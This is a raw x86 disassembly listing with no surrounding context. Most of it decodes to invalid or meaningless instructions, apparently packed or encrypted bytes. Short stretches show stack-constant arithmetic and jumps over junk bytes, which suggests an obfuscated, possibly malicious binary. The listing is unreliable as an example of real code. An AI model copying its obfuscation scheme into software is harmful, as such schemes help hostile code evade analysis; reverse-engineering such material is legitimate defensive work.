  40f05e:	or     dl,BYTE PTR [ebp+0x75502966]
  40f064:	xchg   edx,eax
  40f065:	sbb    eax,0xdfbafad8
  40f06a:	(bad)  
  40f06b:	repnz (bad) 
  40f06d:	xchg   esi,eax
  40f06e:	push   ds
  40f06f:	retf   0xf479
  40f072:	pop    eax
  40f073:	rcl    DWORD PTR [edi+0x6f],1
  40f076:	adc    eax,0x6ee73969
  40f07b:	cld    
  40f07c:	rol    DWORD PTR ds:0xfb38efc,cl
  40f082:	dec    eax
  40f083:	fisttp WORD PTR [eax-0x8f77af1]
  40f089:	(bad)  
  40f08a:	call   FWORD PTR [edi-0x17]
  40f08d:	mov    edi,0x47000002
  40f092:	mov    ds:0x305a70db,al
  40f097:	inc    edx
  40f098:	call   0xa21d:0xaa146552
  40f09f:	jae    0x40f11d
  40f0a1:	jo     0x40f051
  40f0a3:	sbb    BYTE PTR [eax],bl
  40f0a5:	rcl    BYTE PTR [eax+ebx*1],cl
  40f0a8:	sbb    BYTE PTR [edi+0x33],ch
  40f0ab:	mov    esi,ebx
  40f0ad:	fsubrp st(1),st
  40f0af:	sar    BYTE PTR [ebp-0x70e61cc4],0x24
  40f0b6:	sub    BYTE PTR [esi+0x2c1cb3aa],cl
  40f0bc:	adc    al,0xde
  40f0be:	pop    eax
  40f0bf:	push   ebp
  40f0c0:	adc    DWORD PTR [edx],ecx
  40f0c2:	sahf   
  40f0c3:	xchg   BYTE PTR [edi],ch
  40f0c5:	cli    
  40f0c6:	mov    eax,0x85c3e958
  40f0cb:	test   BYTE PTR [ebx+0x78534c6c],0xf6
  40f0d2:	popa   
  40f0d3:	outs   dx,DWORD PTR gs:[esi]
  40f0d5:	call   0x6bfa:0x88b9d379
  40f0dc:	xchg   BYTE PTR [eax],al
  40f0de:	fisttp QWORD PTR [eax-0x5e]
  40f0e1:	mov    ebp,0xce59b141
  40f0e6:	daa    
  40f0e7:	cmp    cl,BYTE PTR [eax]
  40f0e9:	jae    0x40f0d6
  40f0eb:	aad    0xf4
  40f0ed:	mov    al,0xc7
  40f0ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0f0:	int    0x33
  40f0f2:	dec    eax
  40f0f3:	ja     0x40f12e
  40f0f5:	xor    al,0x4b
  40f0f7:	test   dl,cl
  40f0f9:	repz push ds
  40f0fb:	mov    DWORD PTR [ecx-0x34],eax
  40f0fe:	dec    edx
  40f0ff:	xchg   esi,eax
  40f100:	popa   
  40f101:	in     al,0xac
  40f103:	xchg   BYTE PTR [edx-0x165c2d7f],dh
  40f109:	ins    BYTE PTR es:[edi],dx
  40f10a:	cmp    eax,0x24bfd7e7
  40f10f:	xchg   BYTE PTR [ecx],bh
  40f111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f112:	mov    ds:0x3df1570f,al
  40f117:	outs   dx,BYTE PTR ds:[esi]
  40f118:	fdiv   QWORD PTR [edi-0x5a]
  40f11b:	mov    DWORD PTR [ebp+0x48],edi
  40f11e:	ret    0xaf69
  40f121:	add    cl,BYTE PTR [edi-0x4e]
  40f124:	inc    edi
  40f125:	xchg   edx,eax
  40f126:	dec    esi
  40f127:	jo     0x40f149
  40f129:	shl    DWORD PTR [ebx+0x7a82b114],1
  40f12f:	cmp    BYTE PTR [edx],bh
  40f131:	mov    esi,0x7f16f600
  40f136:	pop    ss
  40f137:	hlt    
  40f138:	cld    
  40f139:	mov    edx,0x95e3f31b
  40f13e:	(bad)
  40f142:	js     0x40f179
  40f144:	and    DWORD PTR [eax+eax*2-0x972fcf3],esi
  40f14b:	ja     0x40f182
  40f14d:	inc    ebp
  40f14e:	out    dx,eax
  40f14f:	adc    BYTE PTR [edx+0x3e],0x75
  40f153:	adc    dh,BYTE PTR [esi]
  40f155:	inc    edi
  40f156:	fisub  WORD PTR ds:0xf285a33a
  40f15c:	(bad)  [eax+edi*1]
  40f15f:	ret    0x6f88
  40f162:	out    0xcb,al
  40f164:	std    
  40f165:	repnz fwait
  40f167:	push   0xffffffee
  40f169:	hlt    
  40f16a:	jmp    0xdcd6:0xf1aebea4
  40f171:	xor    BYTE PTR [edx-0x24],al
  40f174:	mov    ebp,0x49b45ece
  40f179:	imul   edx,DWORD PTR [esi-0xdd03f13],0x8
  40f180:	pop    ebx
  40f181:	rol    BYTE PTR [esi],1
  40f183:	test   al,0x29
  40f185:	push   edi
  40f186:	nop
  40f187:	addr16 (bad) 
  40f189:	fisttp QWORD PTR [ecx]
  40f18b:	or     BYTE PTR [ebx],al
  40f18d:	xor    DWORD PTR [ebp-0x40],0xffffffed
  40f191:	popa   
  40f192:	push   edi
  40f193:	in     eax,0x3f
  40f195:	call   0x538d3832
  40f19a:	inc    esp
  40f19b:	push   ebp
  40f19c:	call   0xff53:0xc659d2b
  40f1a3:	rcr    DWORD PTR ds:0x53a373cd,1
  40f1a9:	mov    eax,0xf2a7ab5d
  40f1ae:	pusha  
  40f1af:	cli    
  40f1b0:	std    
  40f1b1:	xchg   DWORD PTR [ebx+0x54],esp
  40f1b4:	scas   al,BYTE PTR es:[edi]
  40f1b5:	stos   DWORD PTR es:[edi],eax
  40f1b6:	dec    edi
  40f1b7:	test   DWORD PTR [eax],0xf0d87466
  40f1bd:	or     al,BYTE PTR [edx]
  40f1bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1c0:	pushf  
  40f1c1:	pop    ecx
  40f1c2:	mov    edi,0x6ebc33ed
  40f1c7:	cdq    
  40f1c8:	xchg   edi,eax
  40f1c9:	nop
  40f1ca:	pop    eax
  40f1cb:	xor    eax,0x5dee448c
  40f1d0:	aas    
  40f1d1:	xor    eax,0x83b00b06
  40f1d6:	pop    edi
  40f1d7:	fldcw  WORD PTR [ebp-0x11f993bb]
  40f1dd:	adc    ch,ch
  40f1df:	int3   
  40f1e0:	jns    0x40f195
  40f1e2:	mov    dl,0xb
  40f1e4:	jno    0x40f18b
  40f1e6:	dec    edx
  40f1e7:	les    ecx,FWORD PTR [edx+0x1744a207]
  40f1ed:	dec    edi
  40f1ee:	repz rol DWORD PTR [eax],0x11
  40f1f2:	scas   eax,DWORD PTR es:[edi]
  40f1f3:	adc    bl,0x1e
  40f1f6:	inc    esi
  40f1f7:	mov    eax,0x408c3fb
  40f1fc:	cld    
  40f1fd:	daa    
  40f1fe:	xchg   esi,eax
  40f1ff:	mov    ss,eax
  40f201:	ins    DWORD PTR es:[edi],dx
  40f202:	push   ebx
  40f203:	jecxz  0x40f209
  40f205:	pop    esi
  40f206:	fdiv   DWORD PTR ds:[edi-0x54253066]
  40f20d:	or     al,0x91
  40f20f:	add    eax,0x8311d0ff
  40f214:	addr16 and ch,0xfd
  40f218:	inc    esp
  40f219:	push   0xffffff8f
  40f21b:	xchg   BYTE PTR [ebx+edi*1-0x50e65582],ah
  40f222:	in     eax,dx
  40f223:	mov    ch,0xd
  40f225:	rcr    DWORD PTR [esi+ebx*8],cl
  40f228:	ins    DWORD PTR es:[edi],dx
  40f229:	mov    al,0xa3
  40f22b:	in     eax,dx
  40f22c:	pop    ecx
  40f22d:	clc    
  40f22e:	stos   DWORD PTR es:[edi],eax
  40f22f:	fwait
  40f230:	in     eax,dx
  40f231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f232:	pop    ds
  40f233:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f234:	fldenv [edx-0x460b863f]
  40f23a:	mov    ah,BYTE PTR [esi]
  40f23c:	into   
  40f23d:	pop    es
  40f23e:	aam    0xd5
  40f240:	push   0xffffffd1
  40f242:	or     eax,0xd8f9a92d
  40f247:	sbb    DWORD PTR [ebx],edi
  40f249:	jo     0x40f214
  40f24b:	pop    es
  40f24c:	xchg   edx,eax
  40f24d:	xchg   DWORD PTR [edi-0x7f3bf9d2],edi
  40f253:	jecxz  0x40f20c
  40f255:	jge    0x40f276
  40f257:	test   ah,ah
  40f259:	jno    0x40f239
  40f25b:	test   BYTE PTR [esi-0x1],dl
  40f25e:	jg     0x40f211
  40f260:	adc    ah,BYTE PTR [ebx-0x286734f1]
  40f266:	(bad)  
  40f268:	xchg   edi,eax
  40f269:	call   0x8ba3da06
  40f26e:	pop    ecx
  40f26f:	xchg   edi,eax
  40f270:	pop    es
  40f271:	jo     0x40f2c5
  40f273:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f274:	dec    ebp
  40f275:	clc    
  40f276:	or     ah,BYTE PTR [ebp+0x6]
  40f279:	inc    ecx
  40f27a:	cmp    edi,ecx
  40f27c:	lock call 0xc6f9:0xa5cf10cf
  40f284:	out    0x85,eax
  40f286:	mov    dh,0x46
  40f288:	(bad)  
  40f289:	aam    0xfd
  40f28b:	int    0x98
  40f28d:	sbb    cl,dh
  40f28f:	cdq    
  40f290:	cmp    edi,edx
  40f292:	jp     0x40f2da
  40f294:	fidiv  WORD PTR [esi-0x74b58c7b]
  40f29a:	push   eax
  40f29b:	cmp    al,0x14
  40f29d:	daa    
  40f29e:	jl     0x40f22d
  40f2a0:	mov    eax,0x661b77a2
  40f2a5:	push   0xc7cdfbe5
  40f2aa:	sbb    al,0x6b
  40f2ac:	cmc    
  40f2ad:	fsub   st,st(0)
  40f2af:	add    BYTE PTR [ebp+0x481f3246],0x72
  40f2b6:	xor    edx,DWORD PTR [esi-0x67a05d7e]
  40f2bc:	cmp    BYTE PTR [ebx],ch
  40f2be:	cmp    BYTE PTR [ebx+edx*2],bh
  40f2c1:	jbe    0x40f267
  40f2c3:	dec    eax
  40f2c4:	or     al,0xfa
  40f2c6:	jp     0x40f29a
  40f2c8:	ret    0x7c82
  40f2cb:	div    BYTE PTR [eax+0x26]
  40f2ce:	in     eax,0x57
  40f2d0:	mov    BYTE PTR [eax+esi*4],ah
  40f2d3:	loope  0x40f322
  40f2d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2d6:	fst    st(1)
  40f2d8:	and    DWORD PTR es:[eax],edi
  40f2db:	sub    BYTE PTR [ecx-0x55],ch
  40f2de:	push   ss
  40f2df:	(bad)  
  40f2e0:	push   ds
  40f2e1:	jg     0x40f2bf
  40f2e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2e4:	xor    eax,0x76111b50
  40f2e9:	ret    0x233e
  40f2ec:	dec    edx
  40f2ed:	xchg   ecx,eax
  40f2ee:	inc    edx
  40f2ef:	retf   
  40f2f0:	inc    edx
  40f2f1:	xchg   BYTE PTR [ecx-0x3c],cl
  40f2f4:	test   DWORD PTR [esi+0x65],edx
  40f2f7:	test   eax,0xefec64e
  40f2fc:	jbe    0x40f2a5
  40f2fe:	scas   al,BYTE PTR es:[edi]
  40f2ff:	(bad)  
  40f300:	lock aad 0xfd
  40f303:	or     eax,0x34fbd0e0
  40f308:	dec    ecx
  40f309:	jmp    0xd164:0x5d485644
  40f310:	div    DWORD PTR [ebp-0x21]
  40f313:	mov    DWORD PTR [ebp+ebp*1+0x7fb5b76d],esi
  40f31a:	bound  ebp,QWORD PTR [edi]
  40f31c:	mov    ch,0x93
  40f31e:	adc    esp,DWORD PTR [esi]
  40f320:	in     al,0x92
  40f322:	adc    esi,DWORD PTR [ebx+0x7df3d504]
  40f328:	inc    esp
  40f329:	xchg   BYTE PTR [edi],cl
  40f32b:	fcos   
  40f32d:	or     BYTE PTR [edx+ebp*2+0x38],bl
  40f331:	inc    ebp
  40f332:	adc    edi,esp
  40f334:	mov    BYTE PTR [ebp-0x1a],0x72
  40f338:	mov    esp,0x1abba6a4
  40f33d:	sar    DWORD PTR [edx],cl
  40f33f:	push   ds
  40f340:	push   ebp
  40f341:	clc    
  40f342:	ds enter 0xec13,0xf5
  40f347:	cmp    DWORD PTR [esp+esi*8+0x71],ebx
  40f34b:	and    cl,BYTE PTR [ebx+0x62]
  40f34e:	pop    ebx
  40f34f:	ret    0x5b5e
  40f352:	leave  
  40f353:	ret    0xc
  40f356:	push   ebp
  40f357:	mov    ebp,esp
  40f359:	sub    esp,0xec
  40f35f:	push   ebx
  40f360:	push   esi
  40f361:	mov    DWORD PTR [ebp-0x8],0x548e
  40f368:	mov    DWORD PTR [ebp-0x4],0x61c2
  40f36f:	mov    eax,DWORD PTR [ebp-0x4]
  40f372:	jmp    0x40f640
  40f377:	outs   dx,BYTE PTR ds:[esi]
  40f378:	rol    BYTE PTR [eax],cl
  40f37a:	jnp    0x40f399
  40f37c:	cmp    ch,BYTE PTR [edx-0x5e]
  40f37f:	ret    0x499f
  40f382:	push   0x53
  40f384:	outs   dx,BYTE PTR ds:[esi]
  40f385:	in     al,dx
  40f386:	mov    esi,0x1818a82b
  40f38b:	mov    esi,0xd9181814
  40f390:	sbb    BYTE PTR [edi-0x8],0x29
  40f394:	jecxz  0x40f36a
  40f396:	ret    0xb21e
  40f399:	js     0x40f3e8
  40f39b:	lds    esp,FWORD PTR [ecx+0x22]
  40f39e:	mov    dl,0xd8
  40f3a0:	lea    esp,ds:0xa84d3b1a
  40f3a6:	xchg   esi,eax
  40f3a7:	daa    
  40f3a8:	mov    eax,ds:0xad9013bb
  40f3ad:	dec    ebx
  40f3ae:	and    BYTE PTR [eax],dh
  40f3b0:	es jno 0x40f3f4
  40f3b3:	fisub  DWORD PTR [esi+ebx*4+0x74]
  40f3b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3b8:	xchg   ebx,eax
  40f3b9:	mov    BYTE PTR [ecx+edx*1-0x6e],cl
  40f3bd:	fwait
  40f3be:	ret    0x2483
  40f3c1:	mov    DWORD PTR [eax+edx*1],0xcff07804
  40f3c8:	mov    dh,0x5a
  40f3ca:	fidivr WORD PTR [ebp+0x25]
  40f3cd:	pushf  
  40f3ce:	jbe    0x40f39e
  40f3d0:	adc    al,bl
  40f3d2:	or     eax,0x221ef8a3
  40f3d7:	sbb    DWORD PTR [edi+0x4a],esi
  40f3da:	repz hlt 
  40f3dc:	adc    ebx,esi
  40f3de:	mov    bh,0xd
  40f3e0:	add    ch,BYTE PTR [esi+0x7d]
  40f3e3:	and    DWORD PTR [esi+eiz*8],ebp
  40f3e6:	and    DWORD PTR [edi],ebx
  40f3e8:	enter  0xd747,0x48
  40f3ec:	sub    al,BYTE PTR [ecx+0x31]
  40f3ef:	xchg   esp,eax
  40f3f0:	xor    eax,0x4527a3c8
  40f3f5:	xchg   ebp,eax
  40f3f6:	jmp    0x4c917148
  40f3fb:	shl    DWORD PTR [ecx],0x2d
  40f3fe:	lock mov bh,0x35
  40f401:	inc    esp
  40f402:	mov    al,ds:0x40cc745
  40f407:	retf   
  40f408:	push   0x2b
  40f40a:	jg     0x40f38c
  40f40c:	rol    BYTE PTR [ebx+0x13],cl
  40f40f:	popf   
  40f410:	add    al,0x71
  40f412:	pop    ebp
  40f413:	dec    ecx
  40f414:	dec    ebp
  40f415:	jp     0x40f39d
  40f417:	pushf  
  40f418:	mov    bl,0x6c
  40f41a:	pushw  es
  40f41c:	add    eax,0x194f26d0
  40f421:	scas   eax,DWORD PTR es:[edi]
  40f422:	and    ch,cl
  40f424:	dec    esp
  40f425:	(bad)  
  40f426:	adc    ecx,ecx
  40f428:	add    eax,DWORD PTR [ebx+0x27f4294c]
  40f42e:	or     dh,BYTE PTR [edx+0x24]
  40f431:	mov    edi,0xaa9e8ef5
  40f436:	push   cs
  40f437:	outs   dx,DWORD PTR ds:[esi]
  40f438:	daa    
  40f439:	lock adc BYTE PTR [ecx-0x64],dl
  40f43d:	cmp    ch,BYTE PTR [ebx]
  40f43f:	mov    ch,0x6d
  40f441:	imul   edx,DWORD PTR [edi+0x54],0x54
  40f445:	or     esp,DWORD PTR [edx-0x62]
  40f448:	int3   
  40f449:	shrd   DWORD PTR [edx+0x50275967],esi,cl
  40f450:	xchg   esp,eax
  40f451:	test   BYTE PTR [ebx+0xe978eeb],ch
  40f457:	cwde   
  40f458:	ror    BYTE PTR [ebx+0x25b2e009],cl
  40f45e:	test   BYTE PTR [edx-0x76],0x11
  40f462:	mov    ds:0x8408d024,al
  40f467:	cmp    BYTE PTR [edi-0x8],ah
  40f46a:	jge    0x40f415
  40f46c:	jb     0x40f472
  40f46e:	pop    edi
  40f46f:	or     BYTE PTR [eax],bh
  40f471:	pop    ebx
  40f472:	pop    ebp
  40f473:	or     BYTE PTR [ecx+0x67],dh
  40f476:	sbb    eax,0x4ee5b988
  40f47b:	repz cmc 
  40f47d:	and    eax,0xa5124a40
  40f482:	sti    
  40f483:	aaa    
  40f484:	sub    bl,BYTE PTR [esp+ebx*1]
  40f487:	or     dl,BYTE PTR [edx-0xa5c63fe]
  40f48d:	or     DWORD PTR [edi+edi*8-0x56ed599c],ecx
  40f494:	adc    DWORD PTR [edx-0x19],ecx
  40f497:	out    0x91,al
  40f499:	outs   dx,DWORD PTR ds:[esi]
  40f49a:	jl     0x40f452
  40f49c:	ficomp WORD PTR [esp+edx*2+0x58]
  40f4a0:	push   esp
  40f4a1:	mov    ss,WORD PTR [esi-0x36]
  40f4a4:	jo     0x40f51c
  40f4a6:	test   al,0x69
  40f4a8:	add    BYTE PTR [bp+0x1c],0xda
  40f4ad:	in     al,dx
  40f4ae:	xor    al,dh
  40f4b0:	pusha  
  40f4b1:	push   cs
  40f4b2:	pop    edx
  40f4b3:	out    dx,al
  40f4b4:	inc    edx
  40f4b5:	fimul  WORD PTR [ebx+ecx*2+0x3f]
  40f4b9:	mov    ch,0x88
  40f4bb:	mov    ebp,0xf04da490
  40f4c0:	sbb    dl,cl
  40f4c2:	pop    edi
  40f4c3:	ins    BYTE PTR es:[edi],dx
  40f4c4:	pop    esp
  40f4c5:	sub    al,0x57
  40f4c7:	nop
  40f4c8:	jo     0x40f494
  40f4ca:	ins    DWORD PTR es:[edi],dx
  40f4cb:	in     al,0x62
  40f4cd:	cdq    
  40f4ce:	(bad)  
  40f4cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4d0:	cmp    DWORD PTR [ebx],esp
  40f4d2:	stos   DWORD PTR es:[edi],eax
  40f4d3:	inc    esi
  40f4d4:	mov    ah,al
  40f4d6:	pop    eax
  40f4d7:	and    al,BYTE PTR [edi]
  40f4d9:	retf   0x8d15
  40f4dc:	frstor [ebx+0x47f16e18]
  40f4e2:	xor    DWORD PTR [ebx-0x24f640c2],edx
  40f4e8:	sub    al,BYTE PTR [ecx+0x3a50eae8]
  40f4ee:	data16 test al,0xd7
  40f4f1:	and    eax,0x255b356c
  40f4f6:	and    BYTE PTR [esi-0x60],al
  40f4f9:	add    al,0x3d
  40f4fb:	sub    DWORD PTR [ecx+0x1e2ce7f1],ecx
  40f501:	adc    edi,eax
  40f503:	pushf  
  40f504:	or     al,0x64
  40f506:	dec    eax
  40f507:	das    
  40f508:	pop    edx
  40f509:	mov    esi,0xbcab51fd
  40f50e:	or     eax,0x3818fa3b
  40f513:	inc    eax
  40f514:	push   edi
  40f515:	mov    cl,0x95
  40f517:	jl     0x40f556
  40f519:	fsub   DWORD PTR [ebx+0x39]
  40f51c:	push   ecx
  40f51d:	dec    eax
  40f51e:	adc    al,0x26
  40f520:	sahf   
  40f521:	sbb    BYTE PTR [eax+0x20a38dbf],bl
  40f527:	adc    esi,edx
  40f529:	aam    0xc9
  40f52b:	outs   dx,DWORD PTR ds:[esi]
  40f52c:	das    
  40f52d:	pop    ecx
  40f52e:	fstp   DWORD PTR [edi]
  40f530:	mov    ah,0xac
  40f532:	imul   esi,DWORD PTR ds:0x981153e4,0xffffffba
  40f539:	test   BYTE PTR [eax],0xa2
  40f53c:	pop    esp
  40f53d:	inc    esi
  40f53e:	jg     0x40f4c7
  40f540:	add    eax,0x4d5405e8
  40f545:	mov    eax,0x70739963
  40f54a:	les    esi,FWORD PTR [edx]
  40f54c:	mov    WORD PTR ds:0x6c5a3c6e,?
  40f552:	cmc    
  40f553:	push   ss
  40f554:	push   cs
  40f555:	repnz sub ebp,DWORD PTR [eax-0x266f200d]
  40f55c:	cdq    
  40f55d:	xchg   edi,eax
  40f55e:	cmp    edi,ebp
  40f560:	out    0xdf,al
  40f562:	int3   
  40f563:	mov    WORD PTR gs:[edi+edi*2-0x29e0b7f4],?
  40f56b:	mov    dh,0xc
  40f56d:	push   es
  40f56e:	pop    eax
  40f56f:	or     al,0xea
  40f571:	jne    0x40f517
  40f573:	imul   eax,DWORD PTR [esi],0x46e08120
  40f579:	add    esp,ecx
  40f57b:	xlat   BYTE PTR ds:[ebx]
  40f57c:	(bad)  
  40f57e:	imul   edi,edi,0xffffffbf
  40f581:	mov    ds:0x794bf7b4,eax
  40f586:	adc    bl,ch
  40f588:	push   sp
  40f58a:	rcl    BYTE PTR [edx+0x36],1
  40f58d:	cmp    al,0xb3
  40f58f:	inc    esi
  40f590:	pop    esi
  40f591:	and    eax,0x47f4c0fb
  40f596:	fimul  WORD PTR [edx]
  40f598:	and    bl,BYTE PTR [edi]
  40f59a:	int    0x91
  40f59c:	sahf   
  40f59d:	test   eax,0x34b88fa8
  40f5a2:	ins    BYTE PTR es:[edi],dx
  40f5a3:	imul   ecx,DWORD PTR [ebx+edi*1+0x4bfd16f3],0xffffff89
  40f5ab:	dec    eax
  40f5ac:	or     cl,ch
  40f5ae:	inc    esp
  40f5af:	push   ebx
  40f5b0:	jnp    0x40f587
  40f5b2:	inc    edx
  40f5b3:	add    ecx,DWORD PTR [edx]
  40f5b5:	inc    esi
  40f5b6:	add    DWORD PTR [edx+0x7f],eax
  40f5b9:	ret    0x695d
  40f5bc:	jl     0x40f59d
  40f5be:	or     eax,edx
  40f5c0:	iret   
  40f5c1:	pusha  
  40f5c2:	lods   eax,DWORD PTR ds:[esi]
  40f5c3:	jp     0x40f60b
  40f5c5:	mov    esi,0x90df08ca
  40f5ca:	lahf   
  40f5cb:	mov    bh,0xd6
  40f5cd:	xchg   esp,eax
  40f5ce:	arpl   di,bp
  40f5d0:	inc    eax
  40f5d1:	jg     0x40f55a
  40f5d3:	add    eax,0xd4581125
  40f5d8:	ins    BYTE PTR es:[edi],dx
  40f5d9:	or     BYTE PTR [edi],dh
  40f5db:	xor    eax,0x41e49d91
  40f5e0:	ror    BYTE PTR [edx],0xba
  40f5e3:	xchg   ebp,eax
  40f5e4:	stc    
  40f5e5:	jns    0x40f568
  40f5e7:	cmc    
  40f5e8:	mov    ebp,0x6a8d5b7f
  40f5ed:	jbe    0x40f57c
  40f5ef:	cmc    
  40f5f0:	adc    dl,dh
  40f5f2:	sbb    ecx,esp
  40f5f4:	lahf   
  40f5f5:	inc    eax
  40f5f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5f7:	add    eax,0xa449e7f3
  40f5fc:	dec    esi
  40f5fd:	lods   eax,DWORD PTR ds:[esi]
  40f5fe:	cmp    BYTE PTR [ecx+ecx*1],0x33
  40f602:	adc    eax,0xa8c5a373
  40f607:	(bad)  
  40f608:	cli    
  40f609:	nop
  40f60a:	pop    eax
  40f60b:	sub    bl,0x67
  40f60e:	sub    DWORD PTR ds:0xcb2c34e8,0xffffffbf
  40f615:	xor    BYTE PTR [ebx],dh
  40f617:	sub    BYTE PTR [esi+0x71fb4b69],bl
  40f61d:	call   0xb49b:0x975acf9a
  40f624:	adc    BYTE PTR [eax-0x250a3454],cl
  40f62a:	pop    ecx
  40f62b:	sub    BYTE PTR [ebp+eiz*2+0x77f6f56b],bl
  40f632:	xlat   BYTE PTR ds:[ebx]
  40f633:	pop    edx
  40f634:	mov    ebx,0xe573a4c1
  40f639:	fwait
  40f63a:	lahf   
  40f63b:	jb     0x40f681
  40f63d:	sbb    BYTE PTR [ebx+eiz*1+0x5f84d8b],bl
  40f644:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f645:	sbb    al,0x0
  40f647:	add    BYTE PTR [ebx],cl
  40f649:	ror    DWORD PTR [ebx+0x4225180d],0x0
  40f650:	lea    eax,[eax+ecx*1-0x7eef]
  40f657:	mov    DWORD PTR [ebp-0x5c],eax
  40f65a:	mov    DWORD PTR [ebp-0x4],0x8ea
  40f661:	mov    DWORD PTR [ebp-0x8],0x5759
  40f668:	mov    eax,DWORD PTR [ebp-0x8]
  40f66b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f66e:	and    eax,0x27f6
  40f673:	xor    eax,ecx
  40f675:	mov    ecx,DWORD PTR ds:0x42264c
  40f67b:	imul   eax,eax,0x18
  40f67e:	xor    eax,0x17970
  40f683:	lea    eax,[ebp+eax*1-0x54]
  40f687:	mov    DWORD PTR [eax],ecx
  40f689:	mov    DWORD PTR [ebp-0x4],0x7584
  40f690:	mov    DWORD PTR [ebp-0x8],0x7c9f
  40f697:	mov    eax,DWORD PTR [ebp-0x8]
  40f69a:	xor    edx,edx
  40f69c:	push   0x3
  40f69e:	pop    ecx
  40f69f:	div    ecx
  40f6a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6a4:	xor    edx,edx
  40f6a6:	push   0x2
  40f6a8:	add    eax,0x14d3
  40f6ad:	and    eax,ecx
  40f6af:	mov    ecx,0x6404
  40f6b4:	sub    ecx,eax
  40f6b6:	mov    DWORD PTR [ebp-0x74],ecx
  40f6b9:	mov    DWORD PTR [ebp-0xc],0x13b5
  40f6c0:	mov    DWORD PTR [ebp-0x8],0x2e54
  40f6c7:	mov    DWORD PTR [ebp-0x4],0x2f11
  40f6ce:	mov    eax,DWORD PTR [ebp-0x8]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6d4:	lea    eax,[ecx+eax*1-0x65ec]
  40f6db:	mov    ecx,0x5e208
  40f6e0:	div    ecx
  40f6e2:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e5:	lea    eax,[eax+ecx*1+0x40c7]
  40f6ec:	mov    DWORD PTR [ebp-0x24],eax
  40f6ef:	mov    DWORD PTR [ebp-0x4],0x1bc6
  40f6f6:	mov    DWORD PTR [ebp-0x8],0x16ac
  40f6fd:	mov    DWORD PTR [ebp-0xc],0x2185
  40f704:	mov    eax,DWORD PTR [ebp-0xc]
  40f707:	mov    ecx,DWORD PTR [ebp-0x8]
  40f70a:	xor    eax,0x1f75
  40f70f:	sub    eax,ecx
  40f711:	mov    ecx,DWORD PTR [ebp-0x4]
  40f714:	jmp    0x40f9e2
  40f719:	mov    ch,0xd2
  40f71b:	pop    edx
  40f71c:	mov    BYTE PTR [edx+0x20],bl
  40f71f:	stos   DWORD PTR es:[edi],eax
  40f720:	and    dl,BYTE PTR [edx+0x34]
  40f723:	sbb    BYTE PTR [edx+0x708f3af7],ch
  40f729:	shl    DWORD PTR [edx+0x14be1818],1
  40f72f:	sbb    BYTE PTR [eax],bl
  40f731:	inc    esi
  40f732:	fdecstp 
  40f734:	cs pop eax
  40f736:	jle    0x40f71d
  40f738:	pop    eax
  40f739:	int    0x50
  40f73b:	test   eax,0x4a481299
  40f740:	adc    eax,0x58a02611
  40f745:	mov    BYTE PTR ds:0x7ce88d97,dh
  40f74b:	or     DWORD PTR [eax],ecx
  40f74d:	daa    
  40f74e:	mov    dh,0xe3
  40f750:	imul   BYTE PTR [eax+eiz*2]
  40f753:	sar    dh,1
  40f755:	push   ss
  40f756:	aam    0x80
  40f758:	ss call 0x1f1e:0x40209cd7
  40f760:	cmp    ebx,esp
  40f762:	dec    eax
  40f763:	in     al,0x86
  40f765:	jnp    0x40f6fd
  40f767:	or     ecx,DWORD PTR [edx-0x79cd95ac]
  40f76d:	pop    ebx
  40f76e:	xor    eax,0xee5aeb4f
  40f773:	into   
  40f774:	outs   dx,DWORD PTR ds:[esi]
  40f775:	jbe    0x40f7c1
  40f777:	pop    edx
  40f778:	inc    ebp
  40f779:	sub    esp,DWORD PTR [edx-0x675dc35]
  40f77f:	arpl   WORD PTR [edx+0x4c],sp
  40f782:	jno    0x40f769
  40f784:	(bad)  
  40f786:	dec    esp
  40f787:	fadd   DWORD PTR ds:0x3fdc7f28
  40f78d:	rcl    BYTE PTR [esi+0x580520f1],1
  40f793:	out    dx,eax
  40f794:	and    cl,BYTE PTR ds:0x57b415a1
  40f79a:	or     eax,0x6abebde4
  40f79f:	mov    ebx,0xb16359d5
  40f7a4:	idiv   BYTE PTR [ebx-0x30]
  40f7a7:	sub    ecx,esi
  40f7a9:	fsub   QWORD PTR [edx-0x52]
  40f7ac:	mov    WORD PTR [ecx+edx*2-0x3699209e],?
  40f7b3:	inc    edi
  40f7b4:	pop    edi
  40f7b5:	scas   eax,DWORD PTR es:[edi]
  40f7b6:	lds    edx,FWORD PTR [ebx+ebx*4]
  40f7b9:	out    0x2b,eax
  40f7bb:	out    0xd2,eax
  40f7bd:	in     eax,0x1
  40f7bf:	push   eax
  40f7c0:	addr16 inc ecx
  40f7c2:	and    al,0xd3
  40f7c4:	mov    dl,BYTE PTR [ecx-0x4e]
  40f7c7:	add    BYTE PTR [edi-0x1520bce4],0x99
  40f7ce:	mov    ds:0xbb8a2989,al
  40f7d3:	sti    
  40f7d4:	lods   al,BYTE PTR ds:[esi]
  40f7d5:	test   al,0xb3
  40f7d7:	push   es
  40f7d8:	std    
  40f7d9:	ins    DWORD PTR es:[edi],dx
  40f7da:	inc    esi
  40f7db:	and    bh,bh
  40f7dd:	lods   al,BYTE PTR ds:[esi]
  40f7de:	mov    di,WORD PTR [eax-0x62e3c61]
  40f7e5:	sbb    cl,BYTE PTR [ebx+0x20]
  40f7e8:	popf   
  40f7e9:	sbb    dl,BYTE PTR [edi+ebx*4]
  40f7ec:	mov    esp,0x18fc04ae
  40f7f1:	adc    edx,DWORD PTR [ebp+0x70303eb8]
  40f7f7:	in     eax,dx
  40f7f8:	or     al,0x2d
  40f7fa:	or     cl,ah
  40f7fc:	add    BYTE PTR [edx],ah
  40f7fe:	imul   edi,DWORD PTR [ebp+edi*2-0x26d0c44c],0x31fed264
